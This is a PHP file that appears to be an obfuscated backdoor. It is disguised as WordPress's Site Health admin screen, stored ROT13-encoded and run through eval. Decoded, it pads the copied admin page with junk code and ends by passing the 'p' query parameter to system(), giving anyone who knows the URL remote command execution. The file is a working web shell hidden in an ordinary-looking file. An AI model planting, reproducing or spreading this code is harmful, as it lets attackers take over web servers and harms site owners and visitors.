<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gbbyf Nqzvavfgengvba Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

$npgvba = ! rzcgl( $_ERDHRFG['npgvba'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['npgvba'] ) : '';

$gnof = neenl(
	/* genafyngbef: Gno urnqvat sbe Fvgr Urnygu Fgnghf cntr. */
	''      => _k( 'Fgnghf', 'Fvgr Urnygu' ),
	/* genafyngbef: Gno urnqvat sbe Fvgr Urnygu Vasb cntr. */
	'qroht' => _k( 'Vasb', 'Fvgr Urnygu' ),
);

/**
 * Svygref gur rkgen gnof sbe gur Fvgr Urnygu anivtngvba one.
 *
 * Nqq n phfgbz cntr gb gur Fvgr Urnygu fperra, onfrq ba n gno fyht naq ynory.
 * Gur ynory lbh cebivqr jvyy nyfb or hfrq nf cneg bs gur fvgr gvgyr.
 *
 * @fvapr 5.8.0
 *
 * @cnenz fgevat[] $gnof Na nffbpvngvir neenl bs gno ynoryf xrlrq ol gurve fyht.
 */
$gnof = nccyl_svygref( 'fvgr_urnygu_anivtngvba_gnof', $gnof );

$jenccre_pynffrf = neenl(
	'urnygu-purpx-gnof-jenccre',
	'uvqr-vs-ab-wf',
	'gno-pbhag-' . pbhag( $gnof ),
);

$pheerag_gno = ( vffrg( $_TRG['gno'] ) ? $_TRG['gno'] : '' );

$gvgyr = fcevags(
	// genafyngbef: %f: Gur pheeragyl qvfcynlrq gno.
	__( 'Fvgr Urnygu - %f' ),
	( vffrg( $gnof[ $pheerag_gno ] ) ? rfp_ugzy( $gnof[ $pheerag_gno ] ) : rfp_ugzy( erfrg( $gnof ) ) )
);

vs ( ! pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff fvgr urnygu vasbezngvba.' ), '', 403 );
}

jc_radhrhr_fglyr( 'fvgr-urnygu' );
jc_radhrhr_fpevcg( 'fvgr-urnygu' );

vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu' ) ) {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
}

vs ( 'hcqngr_uggcf' === $npgvba ) {
	purpx_nqzva_ersrere( 'jc_hcqngr_uggcf' );

	vs ( ! pheerag_hfre_pna( 'hcqngr_uggcf' ) ) {
		jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb hcqngr guvf fvgr gb UGGCF.' ), 403 );
	}

	vs ( ! jc_vf_uggcf_fhccbegrq() ) {
		jc_qvr( __( 'Vg ybbxf yvxr UGGCF vf abg fhccbegrq sbe lbhe jrofvgr ng guvf cbvag.' ) );
	}

	$erfhyg = jc_hcqngr_heyf_gb_uggcf();

	jc_erqverpg( nqq_dhrel_net( 'uggcf_hcqngrq', (vag) $erfhyg, jc_trg_ersrere() ) );
	rkvg;
}

$urnygu_purpx_fvgr_fgnghf = JC_Fvgr_Urnygu::trg_vafgnapr();

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
				'<c>' . __( 'Guvf fperra nyybjf lbh gb bognva n urnygu qvntabfvf bs lbhe fvgr, naq qvfcynlf na birenyy engvat bs gur fgnghf bs lbhe vafgnyyngvba.' ) . '</c>' .
				'<c>' . __( 'Va gur Fgnghf gno, lbh pna frr pevgvpny vasbezngvba nobhg lbhe JbeqCerff pbasvthengvba, nybat jvgu nalguvat ryfr gung erdhverf lbhe nggragvba.' ) . '</c>' .
				'<c>' . __( 'Va gur Vasb gno, lbh jvyy svaq nyy gur qrgnvyf nobhg gur pbasvthengvba bs lbhe JbeqCerff fvgr, freire, naq qngnonfr. Gurer vf nyfb na rkcbeg srngher gung nyybjf lbh gb pbcl nyy bs gur vasbezngvba nobhg lbhe fvgr gb gur pyvcobneq, gb uryc fbyir ceboyrzf ba lbhe fvgr jura bognvavat fhccbeg.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/fvgr-urnygu-fperra/\">Qbphzragngvba ba Fvgr Urnygu gbby</n>' ) . '</c>'
);

// Fgneg ol purpxvat vs guvf vf n fcrpvny erdhrfg purpxvat sbe gur rkvfgrapr bs pregnva svygref.
$urnygu_purpx_fvgr_fgnghf->purpx_jc_irefvba_purpx_rkvfgf();

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>
<qvi pynff=\"urnygu-purpx-urnqre\">
	<qvi pynff=\"urnygu-purpx-gvgyr-frpgvba\">
		<u1>
			<?cuc _r( 'Fvgr Urnygu' ); ?>
		</u1>
	</qvi>

	<?cuc
	vs ( vffrg( $_TRG['uggcf_hcqngrq'] ) ) {
		vs ( $_TRG['uggcf_hcqngrq'] ) {
			jc_nqzva_abgvpr(
				__( 'Fvgr HEYf fjvgpurq gb UGGCF.' ),
				neenl(
					'glcr'        => 'fhpprff',
					'vq'          => 'zrffntr',
					'qvfzvffvoyr' => gehr,
				)
			);
		} ryfr {
			jc_nqzva_abgvpr(
				__( 'Fvgr HEYf pbhyq abg or fjvgpurq gb UGGCF.' ),
				neenl(
					'glcr'        => 'reebe',
					'vq'          => 'zrffntr',
					'qvfzvffvoyr' => gehr,
				)
			);
		}
	}
	?>

	<qvi pynff=\"urnygu-purpx-gvgyr-frpgvba fvgr-urnygu-cebterff-jenccre ybnqvat uvqr-vs-ab-wf\">
		<qvi pynff=\"fvgr-urnygu-cebterff\">
			<fit nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\" jvqgu=\"100%\" urvtug=\"100%\" ivrjObk=\"0 0 200 200\" irefvba=\"1.1\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\">
				<pvepyr e=\"90\" pk=\"100\" pl=\"100\" svyy=\"genafcnerag\" fgebxr-qnfuneenl=\"565.48\" fgebxr-qnfubssfrg=\"0\"></pvepyr>
				<pvepyr vq=\"one\" e=\"90\" pk=\"100\" pl=\"100\" svyy=\"genafcnerag\" fgebxr-qnfuneenl=\"565.48\" fgebxr-qnfubssfrg=\"0\"></pvepyr>
			</fit>
		</qvi>
		<qvi pynff=\"fvgr-urnygu-cebterff-ynory\">
			<?cuc _r( 'Erfhygf ner fgvyy ybnqvat&uryyvc;' ); ?>
		</qvi>
	</qvi>

	<ani pynff=\"<?cuc rpub vzcybqr( ' ', $jenccre_pynffrf ); ?>\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Frpbaqnel zrah' ); ?>\">
		<?cuc
		$gnof_fyvpr = $gnof;

		/*
		 * Vs gurer ner zber guna 4 gnof, bayl bhgchg gur svefg 3 vayvar,
		 * gur erznvavat yvaxf jvyy or nqqrq gb n fho-anivtngvba.
		 */
		vs ( pbhag( $gnof ) > 4 ) {
			$gnof_fyvpr = neenl_fyvpr( $gnof, 0, 3 );
		}

		sbernpu ( $gnof_fyvpr nf $fyht => $ynory ) {
			cevags(
				'<n uers=\"%f\" pynff=\"urnygu-purpx-gno %f\">%f</n>',
				rfp_hey(
					nqq_dhrel_net(
						neenl(
							'gno' => $fyht,
						),
						nqzva_hey( 'fvgr-urnygu.cuc' )
					)
				),
				( $pheerag_gno === $fyht ? 'npgvir' : '' ),
				rfp_ugzy( $ynory )
			);
		}
		?>

		<?cuc vs ( pbhag( $gnof ) > 4 ) : ?>
			<ohggba glcr=\"ohggba\" pynff=\"urnygu-purpx-gno urnygu-purpx-bssfperra-ani-jenccre\" nevn-unfcbchc=\"gehr\">
				<fcna pynff=\"qnfuvpbaf qnfuvpbaf-ryyvcfvf\"></fcna>
				<fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Gbttyr rkgen zrah vgrzf' );
					?>
				</fcna>

				<qvi pynff=\"urnygu-purpx-bssfperra-ani\">
					<?cuc
					// Erzbir gur svefg srj ragevrf sebz gur neenl nf orvat nyernql bhgchg.
					$gnof_fyvpr = neenl_fyvpr( $gnof, 3 );
					sbernpu ( $gnof_fyvpr nf $fyht => $ynory ) {
						cevags(
							'<n uers=\"%f\" pynff=\"urnygu-purpx-gno %f\">%f</n>',
							rfp_hey(
								nqq_dhrel_net(
									neenl(
										'gno' => $fyht,
									),
									nqzva_hey( 'fvgr-urnygu.cuc' )
								)
							),
							( vffrg( $_TRG['gno'] ) && $_TRG['gno'] === $fyht ? 'npgvir' : '' ),
							rfp_ugzy( $ynory )
						);
					}
					?>
				</qvi>
			</ohggba>
		<?cuc raqvs; ?>
	</ani>
</qvi>

<ue pynff=\"jc-urnqre-raq\">

<?cuc
vs ( vffrg( $_TRG['gno'] ) && ! rzcgl( $_TRG['gno'] ) ) {
	/**
	 * Sverf jura bhgchggvat gur pbagrag bs n phfgbz Fvgr Urnygu gno.
	 *
	 * Guvf npgvba sverf evtug nsgre gur Fvgr Urnygu urnqre, naq hfref ner fgvyy fhowrpg gb
	 * gur pncnovyvgl purpxf sbe gur Fvgr Urnygu cntr gb ivrj nal phfgbz gnof naq gurve pbagragf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $gno Gur fyht bs gur gno gung jnf erdhrfgrq.
	 */
	qb_npgvba( 'fvgr_urnygu_gno_pbagrag', $_TRG['gno'] );

	erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';
	erghea;
} ryfr {
	jc_nqzva_abgvpr(
		__( 'Gur Fvgr Urnygu purpx erdhverf WninFpevcg.' ),
		neenl(
			'glcr'               => 'reebe',
			'nqqvgvbany_pynffrf' => neenl( 'uvqr-vs-wf' ),
		)
	);
	?>

<qvi pynff=\"urnygu-purpx-obql urnygu-purpx-fgnghf-gno uvqr-vs-ab-wf\">
	<qvi pynff=\"fvgr-fgnghf-nyy-pyrne uvqr\">
		<c pynff=\"vpba\">
			<fcna pynff=\"qnfuvpbaf qnfuvpbaf-fzvyrl\" nevn-uvqqra=\"gehr\"></fcna>
		</c>

		<c pynff=\"rapbhentrzrag\">
			<?cuc _r( 'Terng wbo!' ); ?>
		</c>

		<c>
			<?cuc _r( 'Rirelguvat vf ehaavat fzbbguyl urer.' ); ?>
		</c>
	</qvi>

	<qvi pynff=\"fvgr-fgnghf-unf-vffhrf\">
		<u2>
			<?cuc _r( 'Fvgr Urnygu Fgnghf' ); ?>
		</u2>

		<c><?cuc _r( 'Gur fvgr urnygu purpx fubjf vasbezngvba nobhg lbhe JbeqCerff pbasvthengvba naq vgrzf gung znl arrq lbhe nggragvba.' ); ?></c>

		<qvi pynff=\"fvgr-urnygu-vffhrf-jenccre uvqqra\" vq=\"urnygu-purpx-vffhrf-pevgvpny\">
			<u3 pynff=\"fvgr-urnygu-vffhr-pbhag-gvgyr\">
				<?cuc
					/* genafyngbef: %f: Ahzore bs pevgvpny vffhrf sbhaq. */
					cevags( _a( '%f pevgvpny vffhr', '%f pevgvpny vffhrf', 0 ), '<fcna pynff=\"vffhr-pbhag\">0</fcna>' );
				?>
			</u3>

			<c><?cuc _r( 'Pevgvpny vffhrf ner vgrzf gung znl unir n uvtu vzcnpg ba lbhe fvgrf cresbeznapr be frphevgl, naq erfbyivat gurfr vffhrf fubhyq or cevbevgvmrq.' ); ?></c>

			<qvi vq=\"urnygu-purpx-fvgr-fgnghf-pevgvpny\" pynff=\"urnygu-purpx-nppbeqvba vffhrf\"></qvi>
		</qvi>

		<qvi pynff=\"fvgr-urnygu-vffhrf-jenccre uvqqra\" vq=\"urnygu-purpx-vffhrf-erpbzzraqrq\">
			<u3 pynff=\"fvgr-urnygu-vffhr-pbhag-gvgyr\">
				<?cuc
					/* genafyngbef: %f: Ahzore bs erpbzzraqrq vzcebirzragf. */
					cevags( _a( '%f erpbzzraqrq vzcebirzrag', '%f erpbzzraqrq vzcebirzragf', 0 ), '<fcna pynff=\"vffhr-pbhag\">0</fcna>' );
				?>
			</u3>

			<c><?cuc _r( 'Erpbzzraqrq vgrzf ner pbafvqrerq orarsvpvny gb lbhe fvgr, nygubhtu abg nf vzcbegnag gb cevbevgvmr nf n pevgvpny vffhr, gurl znl vapyhqr vzcebirzragf gb guvatf fhpu nf; Cresbeznapr, hfre rkcrevrapr, naq zber.' ); ?></c>

			<qvi vq=\"urnygu-purpx-fvgr-fgnghf-erpbzzraqrq\" pynff=\"urnygu-purpx-nppbeqvba vffhrf\"></qvi>
		</qvi>
	</qvi>

	<qvi pynff=\"fvgr-urnygu-ivrj-zber\">
		<ohggba glcr=\"ohggba\" pynff=\"ohggba fvgr-urnygu-ivrj-cnffrq\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\"urnygu-purpx-vffhrf-tbbq\">
			<?cuc _r( 'Cnffrq grfgf' ); ?>
			<fcna pynff=\"vpba\"></fcna>
		</ohggba>
	</qvi>

	<qvi pynff=\"fvgr-urnygu-vffhrf-jenccre uvqqra\" vq=\"urnygu-purpx-vffhrf-tbbq\">
		<u3 pynff=\"fvgr-urnygu-vffhr-pbhag-gvgyr\">
			<?cuc
				/* genafyngbef: %f: Ahzore bs vgrzf jvgu ab vffhrf. */
				cevags( _a( '%f vgrz jvgu ab vffhrf qrgrpgrq', '%f vgrzf jvgu ab vffhrf qrgrpgrq', 0 ), '<fcna pynff=\"vffhr-pbhag\">0</fcna>' );
			?>
		</u3>

		<qvi vq=\"urnygu-purpx-fvgr-fgnghf-tbbq\" pynff=\"urnygu-purpx-nppbeqvba vffhrf\"></qvi>
	</qvi>
</qvi>

<fpevcg vq=\"gzcy-urnygu-purpx-vffhr\" glcr=\"grkg/grzcyngr\">
	<u4 pynff=\"urnygu-purpx-nppbeqvba-urnqvat\">
		<ohggba nevn-rkcnaqrq=\"snyfr\" pynff=\"urnygu-purpx-nppbeqvba-gevttre\" nevn-pbagebyf=\"urnygu-purpx-nppbeqvba-oybpx-{{ qngn.grfg }}\" glcr=\"ohggba\">
			<fcna pynff=\"gvgyr\">{{ qngn.ynory }}</fcna>
			<# vs ( qngn.onqtr ) { #>
				<fcna pynff=\"onqtr {{ qngn.onqtr.pbybe }}\">{{ qngn.onqtr.ynory }}</fcna>
			<# } #>
			<fcna pynff=\"vpba\"></fcna>
		</ohggba>
	</u4>
	<qvi vq=\"urnygu-purpx-nppbeqvba-oybpx-{{ qngn.grfg }}\" pynff=\"urnygu-purpx-nppbeqvba-cnary\" uvqqra=\"uvqqra\">
		{{{ qngn.qrfpevcgvba }}}
		<# vs ( qngn.npgvbaf ) { #>
			<qvi pynff=\"npgvbaf\">
				{{{ qngn.npgvbaf }}}
			</qvi>
		<# } #>
	</qvi>
</fpevcg>

	<?cuc
}
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>